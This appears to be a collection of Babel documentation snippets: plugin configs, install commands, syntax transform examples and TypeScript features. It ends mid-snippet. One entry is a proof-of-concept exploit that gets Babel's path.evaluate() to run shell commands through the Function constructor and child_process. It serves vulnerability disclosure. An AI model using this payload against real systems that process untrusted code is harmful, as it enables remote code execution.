LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-class-static-block"]
}

----------------------------------------

TITLE: Using Source Phase Imports for WebAssembly in JavaScript
DESCRIPTION: This snippet demonstrates the new Source Phase Import proposal, allowing importing of WebAssembly module sources without evaluation.

LANGUAGE: javascript
CODE:
import source mod from "./my-wasm/module.wasm";

----------------------------------------

TITLE: Using TypeScript 3.4 const contexts and readonly arrays
DESCRIPTION: Examples of the new TypeScript 3.4 const assertion and readonly array syntax. This allows marking objects as deeply frozen and arrays as readonly.

LANGUAGE: JavaScript
CODE:
const student = {
  name: "Joe Blogs",
  marks: [25, 23, 30]
} as const;

const vowels: readonly string[] = ["a", "e", "i", "o", "u"];

----------------------------------------

TITLE: Exploiting Babel RCE via evaluate()
DESCRIPTION: Proof of concept demonstrating arbitrary code execution through Babel's path.evaluate() by combining object toString and Function constructor. Executes system commands through child_process.

LANGUAGE: javascript
CODE:
const parser = require("@babel/parser");
const traverse = require("@babel/traverse").default;

const source = `String({  toString: Number.constructor("console.log(process.mainModule.require('child_process').execSync('id').toString())")});`;

const ast = parser.parse(source);

const evalVisitor = {
  Expression(path) {
    path.evaluate();
  },
};

traverse(ast, evalVisitor);

----------------------------------------

TITLE: Flow Type Annotations Transform Example
DESCRIPTION: Demonstrates how Flow type annotations are transformed into comments while preserving type information

LANGUAGE: javascript
CODE:
function foo(bar?) {}
function foo2(bar?: string) {}
function foo(x: number): string {}
type B = {
  name: string,
};
export type GraphQLFormattedError = number;
import type A, { B, C } from "./types";
import typeof D, { E, F } from "./types";

LANGUAGE: javascript
CODE:
"use strict";

function foo(bar /*:: ?*/) {}
function foo2(bar /*:: ?: string*/) {}
function foo(x /*: number*/) /*: string*/ {}
/*:: type B = {
  name: string;
};*/
/*:: export type GraphQLFormattedError = number;*/
/*:: import type A, { B, C } from './types';*/
/*:: import typeof D, { E, F } from './types';*/

----------------------------------------

TITLE: TypeScript 4.0 Variadic Tuple Types
DESCRIPTION: Demonstration of TypeScript 4.0's new variadic tuple types feature, allowing generic spreads in tuple types at any location.

LANGUAGE: TypeScript
CODE:
type Arr = readonly any[];

function collect<L extends Arr, M extends Arr>(b: boolean, l: L, m: M): [boolean, ...L, ...M] {
  return [b, ...l, ...m];
}

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: Example of using the plugin programmatically via Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-computed-properties"]
});

----------------------------------------

TITLE: Configuring remove-console Babel Plugin with Options
DESCRIPTION: Shows how to configure the remove-console plugin with options, specifically excluding certain console methods from removal.

LANGUAGE: JSON
CODE:
{
  "plugins": [["transform-remove-console", { "exclude": ["error", "warn"] }]]
}

----------------------------------------

TITLE: Transforming instanceof Operator - Input Example
DESCRIPTION: Example input code showing basic instanceof operator usage that will be transformed by the plugin.

LANGUAGE: javascript
CODE:
foo instanceof Bar;

----------------------------------------

TITLE: Using @babel/plugin-transform-runtime via Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use @babel/plugin-transform-runtime when transpiling code using Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-runtime"],
});

----------------------------------------

TITLE: Constructing Nested Classes with Optional Chaining in JavaScript
DESCRIPTION: Demonstrates how to safely instantiate classes that may be nested within objects using optional chaining. Shows handling of non-existent constructors and direct class instantiation.

LANGUAGE: javascript
CODE:
const obj = {
  foo: {
    bar: {
      baz: class {
      },
    },
  },
};

const baz = new obj?.foo?.bar?.baz(); // baz instance

const safe = new obj?.qux?.baz(); // undefined
const safe2 = new obj?.foo.bar.qux?.(); // undefined

const willThrow = new obj?.foo.bar.qux(); // Error: not a constructor

class Test {
}
new Test?.(); // test instance

new exists?.(); // undefined

----------------------------------------

TITLE: Converting Property Mutators Example - JavaScript Input
DESCRIPTION: Example input code showing property getter and setter definitions using ES6 syntax.

LANGUAGE: javascript
CODE:
var foo = {
  get bar() {
    return this._bar;
  },
  set bar(value) {
    this._bar = value;
  },
};

----------------------------------------

TITLE: Function Bind Operator Basic Syntax Examples
DESCRIPTION: Demonstrates the basic syntax equivalences of the function bind operator (::) compared to traditional bind/call methods.

LANGUAGE: javascript
CODE:
obj::func;
// is equivalent to:
func.bind(obj)

::obj.func;
// is equivalent to:
obj.func.bind(obj);

obj::func(val);
// is equivalent to:
func
  .call(obj, val)

::obj.func(val);
// is equivalent to:
obj.func.call(obj, val);

----------------------------------------

TITLE: Node API Integration
DESCRIPTION: Example of using the plugin programmatically via Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-explicit-resource-management"]
});

----------------------------------------

TITLE: Spec Mode Transform Example
DESCRIPTION: Example showing how arrow functions are transformed when the spec option is enabled, including runtime checks and name preservation.

LANGUAGE: javascript
CODE:
var _this = this;

var a = function a() {
  babelHelpers.newArrowCheck(this, _this);
}.bind(this);
var a = function a(b) {
  babelHelpers.newArrowCheck(this, _this);
  return b;
}.bind(this);

const double = [1, 2, 3].map(
  function(num) {
    babelHelpers.newArrowCheck(this, _this);
    return num * 2;
  }.bind(this)
);
console.log(double); // [2,4,6]

var bob = {
  _name: "Bob",
  _friends: ["Sally", "Tom"],
  printFriends() {
    var _this2 = this;

    this._friends.forEach(
      function(f) {
        babelHelpers.newArrowCheck(this, _this2);
        return console.log(this._name + " knows " + f);
      }.bind(this)
    );
  },
};
console.log(bob.printFriends());

----------------------------------------

TITLE: Configuring Babel to Use block-scoped-functions Plugin
DESCRIPTION: Demonstrates how to configure Babel to use the @babel/plugin-transform-block-scoped-functions plugin in a babel.config.json file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-block-scoped-functions"]
}

----------------------------------------

TITLE: Demonstrating New TypeScript 5.0 Features
DESCRIPTION: Illustrates new TypeScript 5.0 features including const modifiers for type parameters and export type * declarations.

LANGUAGE: TypeScript
CODE:
function getName<const T extends { name: string }>(user: T): T["name"] {
    return user.name;
}

let name = getName({ name: "Babel" });
//  ^? inferred type: "Babel", instead of just string.

LANGUAGE: TypeScript
CODE:
export type * from "./mod";
export type * as ns from "./mod";

----------------------------------------

TITLE: Transforming Nullish Coalescing Operator in Loose Mode
DESCRIPTION: Demonstrates how the nullish coalescing operator is transformed when the 'loose' option is enabled, using loose equality checks.

LANGUAGE: JavaScript
CODE:
var foo = object.foo ?? "default";

LANGUAGE: JavaScript
CODE:
var _object$foo;

var foo = (_object$foo = object.foo) != null ? _object$foo : "default";

----------------------------------------

TITLE: Plugin Usage via Node API
DESCRIPTION: Shows how to use the plugin programmatically through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-new-target"]
});

----------------------------------------

TITLE: Private Fields in 'in' Operator in JavaScript
DESCRIPTION: Shows the usage of the new Stage 1 proposal for checking the existence of private fields using the 'in' operator.

LANGUAGE: JavaScript
CODE:
class Person {
  #name;

  hug(other) {
    if (#name in other) console.log(`${this.#name} 🤗 ${other.#name}`);
    else console.log("It's not a person!")
  }
}

----------------------------------------

TITLE: Installing @babel/plugin-transform-jscript via npm
DESCRIPTION: This command installs the @babel/plugin-transform-jscript plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-jscript

----------------------------------------

TITLE: Configuring babel-plugin-minify-mangle-names in Babel
DESCRIPTION: These JSON snippets show how to configure the plugin in a Babel configuration file, both with and without options.

LANGUAGE: JSON
CODE:
{
  "plugins": ["minify-mangle-names"]
}

LANGUAGE: JSON
CODE:
{
  "plugins": [
    ["minify-mangle-names", { "exclude": { "foo": true, "bar": true} }]
  ]
}

----------------------------------------

TITLE: Transforming Regular Expression with Duplicate Named Capturing Groups in JavaScript
DESCRIPTION: This snippet demonstrates the input and output of the plugin transformation. It shows how a regular expression with duplicate named capturing groups is converted to use a wrapper function.

LANGUAGE: JavaScript
CODE:
var re = /(?<year>\d{4})-(?<month>\d{2})|(?<month>\d{2})-(?<year>\d{4})/;

console.log(re.exec("02-1999").groups.year);

LANGUAGE: JavaScript
CODE:
var re = _wrapRegExp(/(\d{4})-(\d{2})|(\d{2})-(\d{4})/, {
  year: [1, 4],
  month: [2, 3],
});

console.log(re.exec("02-1999").groups.year);

----------------------------------------

TITLE: Transforming Named Capturing Groups in JavaScript RegExp
DESCRIPTION: Demonstrates how the plugin transforms a regular expression with named capturing groups into a compatible format for older environments.

LANGUAGE: JavaScript
CODE:
var re = /(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/;

console.log(re.exec("1999-02-29").groups.year);

LANGUAGE: JavaScript
CODE:
var re = _wrapRegExp(/(\d{4})-(\d{2})-(\d{2})/, { year: 1, month: 2, day: 3 });

console.log(re.exec("1999-02-29").groups.year);

----------------------------------------

TITLE: Class Super Method Example
DESCRIPTION: Example showing how constantSuper assumption affects super class method calls.

LANGUAGE: javascript
CODE:
class Child extends Base {
  method() {
    super.method(2);
  }
}

----------------------------------------

TITLE: Configuring Babel for Pipeline Operator with Topic Tokens
DESCRIPTION: This JSON configuration enables the pipeline operator proposal in Babel with the 'hack' proposal and specifies a topic token (either '^^' or '@@').

LANGUAGE: JSON
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-pipeline-operator", {
      "proposal": "hack",
      "topicToken": "^^" // or "@@"
    }]
  ]
}

----------------------------------------

TITLE: Template String Usage with Syntactic Placeholders
DESCRIPTION: Example demonstrating template usage with %%name%% style syntactic placeholders for generating AST nodes

LANGUAGE: javascript
CODE:
import template from "@babel/template";
import generate from "@babel/generator";
import * as t from "@babel/types";

const buildRequire = template(`
  var %%importName%% = require(%%source%%);
`);

const ast = buildRequire({
  importName: t.identifier("myModule"),
  source: t.stringLiteral("my-module"),
});

console.log(generate(ast).code);

----------------------------------------

TITLE: Implementing Member Expression Transformation in Babel
DESCRIPTION: Demonstrates how to use the memberExpressionToFunctions helper to transform member expressions into function calls. The implementation requires defining a visitor pattern and state object with get, set, and call methods. Optionally includes a memoise method for handling self-referential updates.

LANGUAGE: javascript
CODE:
const visitor = {
  MemberExpression(memberPath, state) {

    if (someCondition(memberPath)) {

      // The handle method is supplied by memberExpressionToFunctions.
      // It should be called whenever a MemberExpression should be
      // converted into the proper function calls.
      state.handle(memberPath);

    }

  },
};

// The helper requires three special methods on state: `get`, `set`, and
// `call`.
// Optionally, a special `memoise` method may be defined, which gets
// called if the member is in a self-referential update expression.
// Everything else will be passed through as normal.
const state = {
  get(memberPath) {
    // Return some AST that will get the member
    return t.callExpression(
      this.file.addHelper('superGet'),
      [t.thisExpression(), memberPath.node.property]
    );
  },

  set(memberPath, value) {
    // Return some AST that will set the member
    return t.callExpression(
      this.file.addHelper('superSet'),
      [t.thisExpression(), memberPath.node.property, value]
    );
  },

  call(memberPath, args) {
    // Return some AST that will call the member with the proper context
    // and args
    return t.callExpression(
      t.memberExpression(this.get(memberPath), t.identifier("apply")),
      [t.thisExpression(), t.arrayExpression(args)]
    );
  },

  memoise(memberPath) {
    const { node } = memberPath;
    if (node.computed) {
      MEMOISED.set(node, ...);
    }
  },

  // The handle method is provided by memberExpressionToFunctions.
  // handle(memberPath) { ... }

  // Other state stuff is left untouched.
  someState: new Set(),
};

// Replace all the special MemberExpressions in rootPath, as determined
// by our visitor, using the state methods.
memberExpressionToFunctions(rootPath, visitor, state);

----------------------------------------

TITLE: Basic Do Expression Usage in JavaScript
DESCRIPTION: Demonstrates the basic usage of do expressions as an alternative to ternary operators for conditional logic.

LANGUAGE: javascript
CODE:
let a = do {
  if (x > 10) {
    ("big");
  } else {
    ("small");
  }
};
// is equivalent to:
let a = x > 10 ? "big" : "small";

----------------------------------------

TITLE: Configuring Babel to Use @babel/plugin-syntax-module-string-names
DESCRIPTION: This JSON configuration snippet shows how to include the @babel/plugin-syntax-module-string-names plugin in a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-syntax-module-string-names"]
}

----------------------------------------

TITLE: Configuring Babel for Explicit Resource Management
DESCRIPTION: Shows how to enable support for the Explicit Resource Management proposal in Babel configuration.

LANGUAGE: JSON
CODE:
{
  "plugins": [
    "@babel/plugin-proposal-explicit-resource-management"
  ]
}

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the function name transform plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-function-name"]
}

----------------------------------------

TITLE: Transforming Basic Logical Assignment Operators in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms OR (||=) and AND (&&=) logical assignment operators into equivalent expressions with proper variable handling and object property access.

LANGUAGE: javascript
CODE:
a ||= b;
obj.a.b ||= c;

a &&= b;
obj.a.b &&= c;

LANGUAGE: javascript
CODE:
var _obj$a, _obj$a2;

a || (a = b);
(_obj$a = obj.a).b || (_obj$a.b = c);

a && (a = b);
(_obj$a2 = obj.a).b && (_obj$a2.b = c);

----------------------------------------

TITLE: Example Numeric Literal Minification in JavaScript
DESCRIPTION: Demonstrates how the plugin converts regular numeric literals to scientific notation format for optimization purposes.

LANGUAGE: javascript
CODE:
[1000, -20000]

LANGUAGE: javascript
CODE:
[1e3, -2e4]

----------------------------------------

TITLE: Demonstrating String Names for Imports and Exports
DESCRIPTION: This example shows the new feature allowing strings as names for imported and exported variables, enabling the use of any valid UTF-16 name across modules.

LANGUAGE: javascript
CODE:
// emojis.js
let happy = "wooo!";
export { happy as "😃" };

// main.js
import { "😃" as smile } from "./emojis.js";
console.log(smile); // wooo!

----------------------------------------

TITLE: Applying React JSX Compat Transform via Babel Node API
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-react-jsx-compat plugin programmatically with the Babel Core API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-react-jsx-compat"],
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-strict-mode via npm
DESCRIPTION: This command installs the @babel/plugin-transform-strict-mode plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-strict-mode

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: Basic babel.config.json configuration using @babel/preset-env

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-env"]
}

----------------------------------------

TITLE: Using Plugin via Node API - JavaScript
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-literals"],
});

----------------------------------------

TITLE: Demonstrating Top-Level Await and Private Field Brand Checks in JavaScript
DESCRIPTION: Example showing the new default support for top-level await and ergonomic brand checks for private fields, both now Stage 4 features.

LANGUAGE: javascript
CODE:
import * as db from "database";

await db.connect(); // top-level await

class DBConnector {
  #password;
  static isConnector(obj) {
    return #password in obj; // ergonomic brand checks
  }
}

----------------------------------------

TITLE: Installing @babel/plugin-syntax-dynamic-import via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-dynamic-import plugin using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-dynamic-import

----------------------------------------

TITLE: React Scripts Pipeline Example
DESCRIPTION: Demonstrates the use of pipeline operator with chalk formatting in React scripts, comparing traditional approach with pipeline syntax using the ^^ topic token.

LANGUAGE: javascript
CODE:
// Status quo
console.log(
  chalk.dim(
    `$ ${Object.keys(envars)
      .map(envar => `${envar}=${envars[envar]}`)
      .join(' ')}`,
    'node',
    args.join(' ')
  )
);

// With pipes
Object.keys(envars)
  .map(envar => `${envar}=${envars[envar]}`)
  .join(' ')
  |> `$ ${^^}`
  |> chalk.dim(^^, 'node', args.join(' '))
  |> console.log(^^);

----------------------------------------

TITLE: Installing @babel/helpers via npm
DESCRIPTION: Command to install @babel/helpers as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/helpers

----------------------------------------

TITLE: Using Top-level Await in Babel 7.7.0
DESCRIPTION: Parser support for the top-level await proposal.

LANGUAGE: JavaScript
CODE:
import db from "./database.js";

await db.connect();

----------------------------------------

TITLE: Configuring Babel Decorator Syntax Plugin in Config File
DESCRIPTION: JSON configuration for enabling the decorator syntax plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-decorators"]
}

----------------------------------------

TITLE: Configuring mutableTemplateObject Assumption
DESCRIPTION: Demonstrates how to configure the mutableTemplateObject assumption in the Babel configuration file, which is recommended over the 'loose' option.

LANGUAGE: JSON
CODE:
{
  "assumptions": {
    "mutableTemplateObject": true
  }
}

----------------------------------------

TITLE: Configuring Babel to Use Strict Mode Transform Plugin
DESCRIPTION: This JSON configuration for Babel enables the @babel/plugin-transform-strict-mode plugin in the project's babel.config.json file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-strict-mode"]
}

----------------------------------------

TITLE: Plugin Usage via Node API
DESCRIPTION: Example of using the plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-async-to-generator"],
});

----------------------------------------

TITLE: Example of Flow type parsing without @flow pragma
DESCRIPTION: Illustrates how Flow-specific syntax can be misinterpreted without proper configuration.

LANGUAGE: JavaScript
CODE:
f < T > e;

----------------------------------------

TITLE: Configuring Plugin in Babel Config
DESCRIPTION: JSON configuration to enable the plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-member-expression-literals"]
}

----------------------------------------

TITLE: Configuring Babel to Use @babel/plugin-transform-modules-amd
DESCRIPTION: This JSON configuration snippet shows how to include the @babel/plugin-transform-modules-amd plugin in a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-modules-amd"]
}

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the TypeScript transform plugin

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-typescript

----------------------------------------

TITLE: Advanced Babel Configuration
DESCRIPTION: Configuration with specific options to control transformation of different types of functions (async, generators, async generators).

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-regenerator",
      {
        "asyncGenerators": false,
        "generators": false,
        "async": false
      }
    ]
  ]
}

----------------------------------------

TITLE: Configuring core-js 3 support in @babel/plugin-transform-runtime
DESCRIPTION: Example of enabling core-js 3 support in the @babel/plugin-transform-runtime configuration. This allows using core-js 3 features without polluting the global scope.

LANGUAGE: JavaScript
CODE:
plugins: [
  ["@babel/transform-runtime", {
    corejs: 3,
  }]
]

----------------------------------------

TITLE: Using class static block syntax plugin via Babel CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-class-static-block plugin when transpiling a JavaScript file with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-class-static-block script.js

----------------------------------------

TITLE: Converting Property Mutators Example - JavaScript Output
DESCRIPTION: Transformed output code showing how the plugin converts property mutators to Object.defineProperties() calls.

LANGUAGE: javascript
CODE:
var foo = Object.defineProperties(
  {},
  {
    bar: {
      get: function() {
        return this._bar;
      },
      set: function(value) {
        this._bar = value;
      },
      configurable: true,
      enumerable: true,
    },
  }
);

----------------------------------------

TITLE: TypeScript Support Example
DESCRIPTION: Demonstration of TypeScript syntax support in Babel 7 showing type removal during compilation.

LANGUAGE: TypeScript
CODE:
interface Person {
  firstName: string;
  lastName: string;
}

function greeter(person : Person) {
  return "Hello, " + person.firstName + " " + person.lastName;
}

----------------------------------------

TITLE: Demonstrating Constant Folding Optimizations in JavaScript
DESCRIPTION: This snippet shows various JavaScript expressions before and after constant folding optimizations. It includes string concatenation, arithmetic operations, array methods, and string operations.

LANGUAGE: JavaScript
CODE:
"a" + "b"
2 * 3;
4 | 3;
"b" + a + "c" + "d" + g + z + "f" + "h" + "i"

[a, b, c].concat([d, e], f, g, [h]);
["a", "b", "c"].join();
["a", "b", "c"].join('@');
[1, 2, 3].length;
[1, 2, 3][1];
[1, 2, 3].shift();
[1, 2, 3].slice(0, 2);
[a, b, c].pop();
[a, b, c].reverse();
"a,b,c".split(",");
"abc"[0];
"abc".charAt();
"abc".charAt(1);
"abc".length;

LANGUAGE: JavaScript
CODE:
"ab";
6;
7;
"b" + a + "cd" + g + z + "fhi";

[a, b, c, d, e, f, g, h];
"a,b,c";
"a@b@c";
3;
2;
2;
[1, 2];
c;
[c, b, a];
["a", "b", "c"];
"a";
"a";
"a";
"b";
3;

----------------------------------------

TITLE: Using @babel/helpers Directly in JavaScript
DESCRIPTION: Example of importing and using @babel/helpers directly in JavaScript code, demonstrating how to access and check a specific helper.

LANGUAGE: javascript
CODE:
import * as helpers from "@babel/helpers";
import * as t from "@babel/types";

const typeofHelper = helpers.get("typeof");

t.isExpressionStatement(typeofHelper);
// true

----------------------------------------

TITLE: Running JavaScript Files with Babel Node
DESCRIPTION: Command to compile and run a JavaScript file using babel-node

LANGUAGE: shell
CODE:
npx babel-node test

----------------------------------------

TITLE: Basic Plugin Configuration
DESCRIPTION: Basic JSON configuration for enabling the plugin in babel.config.json without any options.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-block-scoping"]
}

----------------------------------------

TITLE: Configuring Babel Plugin - JSON
DESCRIPTION: JSON configuration to enable the exponentiation operator transform plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-exponentiation-operator"]
}

----------------------------------------

TITLE: Function Name Transform Example
DESCRIPTION: Demonstrates how the plugin transforms an arrow function expression to include an explicit function name matching the variable it's assigned to.

LANGUAGE: javascript
CODE:
let number = x => x;

LANGUAGE: javascript
CODE:
var number = function number(x) {
  return x;
};

----------------------------------------

TITLE: Configuring Babel to Use Unicode Regex Transform Plugin
DESCRIPTION: This JSON configuration adds the @babel/plugin-transform-unicode-regex plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-unicode-regex"]
}

----------------------------------------

TITLE: Installing Babel Plugin for Nullish Coalescing Operator
DESCRIPTION: Shows the npm command to install the Babel plugin for transforming the nullish coalescing operator.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-nullish-coalescing-operator

----------------------------------------

TITLE: Transforming for-of Loop with Loose Mode in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms a for-of loop when the loose mode is enabled, optimizing for arrays.

LANGUAGE: JavaScript
CODE:
for (var i of foo) {
}

LANGUAGE: JavaScript
CODE:
for (
  var _iterator = foo,
    _isArray = Array.isArray(_iterator),
    _i = 0,
    _iterator = _isArray ? _iterator : _iterator[Symbol.iterator]();
  ;

) {
  var _ref;

  if (_isArray) {
    if (_i >= _iterator.length) break;
    _ref = _iterator[_i++];
  } else {
    _i = _iterator.next();
    if (_i.done) break;
    _ref = _i.value;
  }

  var i = _ref;
}

----------------------------------------

TITLE: Node API Integration
DESCRIPTION: JavaScript code showing how to use the plugin programmatically via the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["transform-merge-sibling-variables"],
});

----------------------------------------

TITLE: Configuring Babel to Use @babel/plugin-transform-jscript
DESCRIPTION: This JSON configuration adds the @babel/plugin-transform-jscript plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-jscript"]
}

----------------------------------------

TITLE: Installing @babel/plugin-transform-object-super via npm
DESCRIPTION: This command installs the @babel/plugin-transform-object-super Babel plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-object-super

----------------------------------------

TITLE: Configuring Babel to import Record and Tuple polyfill
DESCRIPTION: JSON configuration for enabling the importPolyfill option in the Record and Tuple plugin, which injects imports from @bloomberg/record-tuple-polyfill.

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-proposal-record-and-tuple",
      {
        "importPolyfill": true
      }
    ]
  ]
}

----------------------------------------

TITLE: Transforming JavaScript Functions for JScript Compatibility
DESCRIPTION: This example demonstrates how the plugin transforms a simple function declaration to be compatible with JScript. It wraps the function in an IIFE and adds 'use strict' directive.

LANGUAGE: JavaScript
CODE:
var foo = function bar() {};

LANGUAGE: JavaScript
CODE:
"use strict";

var foo = (function() {
  function bar() {}

  return bar;
})();

----------------------------------------

TITLE: Installing @babel/plugin-transform-property-literals via npm
DESCRIPTION: This command installs the @babel/plugin-transform-property-literals plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install @babel/plugin-transform-property-literals --save-dev

----------------------------------------

TITLE: Configuring Gulp Task for Babel Transpilation with Source Maps in JavaScript
DESCRIPTION: This snippet demonstrates a more advanced Gulp task that includes source map generation. It processes all JavaScript files in the 'src' directory, applies Babel transpilation, concatenates the files, generates source maps, and outputs the result to the 'dist' directory.

LANGUAGE: JavaScript
CODE:
var gulp = require("gulp");
var sourcemaps = require("gulp-sourcemaps");
var babel = require("gulp-babel");
var concat = require("gulp-concat");

gulp.task("default", function () {
  return gulp.src("src/**/*.js")
    .pipe(sourcemaps.init())
    .pipe(babel())
    .pipe(concat("all.js"))
    .pipe(sourcemaps.write("."))
    .pipe(gulp.dest("dist"));
});

----------------------------------------

TITLE: Evaluating Code with Babel Node
DESCRIPTION: Example of evaluating JavaScript code directly with babel-node

LANGUAGE: shell
CODE:
npx babel-node -e "class Test { }"

----------------------------------------

TITLE: Running Babel Node with On-the-fly Installation
DESCRIPTION: Command to run babel-node without prior installation of dependencies

LANGUAGE: shell
CODE:
npx -p @babel/core -p @babel/node babel-node

----------------------------------------

TITLE: Transforming RegExp Constructor to Literal in JavaScript
DESCRIPTION: This example demonstrates how the plugin transforms a RegExp constructor into a RegExp literal. It converts 'new RegExp(foo + "c", "i")' to '/ab+c/i'.

LANGUAGE: JavaScript
CODE:
const foo = "ab+";
var a = new RegExp(foo + "c", "i");

LANGUAGE: JavaScript
CODE:
const foo = "ab+";
var a = /ab+c/i;

----------------------------------------

TITLE: TypeScript Const Enum Compilation Examples
DESCRIPTION: Demonstrates how Babel handles const enum compilation with and without the optimizeConstEnums option enabled.

LANGUAGE: typescript
CODE:
// Input
const enum Animals { Dog }
console.log(Animals.Dog);

// Output (default)
var Animals;
(function (Animals) {
  Animals[Animals["Dog"] = 0] = "Dog";
})(Animals || (Animals = {}));

console.log(Animals.Dog);

// Output with `optimizeConstEnums`
console.log(0);

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the import reflection syntax plugin in Babel config file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-import-reflection"]
}

----------------------------------------

TITLE: Plugin Configuration Examples
DESCRIPTION: Demonstrates various ways to configure and use the plugin through configuration files, CLI, and Node API.

LANGUAGE: javascript
CODE:
// without options
{
  "plugins": ["@babel/plugin-transform-classes"]
}

// with options
{
  "plugins": [
    ["@babel/plugin-transform-classes", {
      "loose": true
    }]
  ]
}

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-classes script.js

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-classes"],
});

----------------------------------------

TITLE: Configuring React Preset for Spread Optimization
DESCRIPTION: Example of configuring @babel/preset-react to use the new spread optimization for JSX compilation.

LANGUAGE: json
CODE:
{
  "presets": [
    ["@babel/react", { "useSpread": true }]
  ]
}

----------------------------------------

TITLE: Plugin Usage via CLI
DESCRIPTION: Demonstrates how to use the plugin through Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-new-target script.js

----------------------------------------

TITLE: Using flow-strip-types plugin via Babel CLI
DESCRIPTION: Shows the command to use the plugin with Babel's command-line interface.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-flow-strip-types script.js

----------------------------------------

TITLE: Babel Config Setup
DESCRIPTION: Configuration in babel.config.json to enable the plugin

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-json-modules"]
}

----------------------------------------

TITLE: Using @babel/plugin-syntax-dynamic-import via Node API
DESCRIPTION: JavaScript code to use the @babel/plugin-syntax-dynamic-import plugin with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-dynamic-import"],
});

----------------------------------------

TITLE: Installing and Configuring Babel Preset for React
DESCRIPTION: Commands to install the React preset for Babel and the corresponding .babelrc configuration.

LANGUAGE: Shell
CODE:
$ npm install --save-dev babel-preset-react

LANGUAGE: JavaScript
CODE:
{
  "presets": ["react"]
}

----------------------------------------

TITLE: Plugin Installation - NPM/Yarn
DESCRIPTION: Command to install the plugin using npm or yarn package managers.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-unicode-escapes

----------------------------------------

TITLE: Installing babel-plugin-transform-remove-undefined via npm
DESCRIPTION: This command installs the babel-plugin-transform-remove-undefined plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install babel-plugin-transform-remove-undefined --save-dev

----------------------------------------

TITLE: Basic Plugin Configuration
DESCRIPTION: JSON configuration for enabling the plugin without options in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-computed-properties"]
}

----------------------------------------

TITLE: Retrieving Babel Test Fixtures in JavaScript
DESCRIPTION: This code snippet demonstrates how to import and use the @babel/helper-fixtures package to retrieve test fixtures for a Babel project. It defines TypeScript-like type definitions for the structure of the returned data, including TestFile, Test, and Suite objects. The getFixtures function is then called with a file path to retrieve an array of Suite objects.

LANGUAGE: JavaScript
CODE:
import getFixtures from "@babel/helper-fixtures";

type TestFile = {
  loc: string;
  code: string;
  filename: string;
};

type Test = {
  title: string;
